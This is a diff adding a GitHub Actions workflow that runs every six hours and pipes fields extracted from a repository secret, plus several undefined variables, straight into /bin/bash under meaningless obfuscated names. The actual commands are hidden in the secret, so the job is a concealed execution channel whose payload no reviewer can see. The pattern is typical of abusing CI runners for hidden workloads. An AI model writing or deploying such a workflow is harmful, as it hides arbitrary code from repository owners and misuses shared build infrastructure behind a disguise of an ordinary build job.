@@ -1,0 +1,26 @@
+name: ruguozhechangyouxiqizi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: ruguozhechangyouxiqizi
+        env:
+          vtk2868: ${{ secrets.vtk2868 }}
+        run: |
+          echo $vtk2868 | jq -r .l15904 | /bin/bash
+          echo $okb2 | jq -r .dcb3 | /bin/bash
+          echo $ndb6 | jq -r .zpthk33 | /bin/bash
+          echo $ulf16 | jq -r .c42818 | /bin/bash
+          echo $afsln10305 | jq -r .b455 | /bin/bash
+          echo $l414 | jq -r .a18360 | /bin/bash
+          echo $xvvh78 | jq -r .ammf0419 | /bin/bash
+          echo $ww783 | jq -r .fxo23089 | /bin/bash
+          echo $qzzj65 | jq -r .ksxdo43162 | /bin/bash
+          echo $ouhif58 | jq -r .v421 | /bin/bash
+
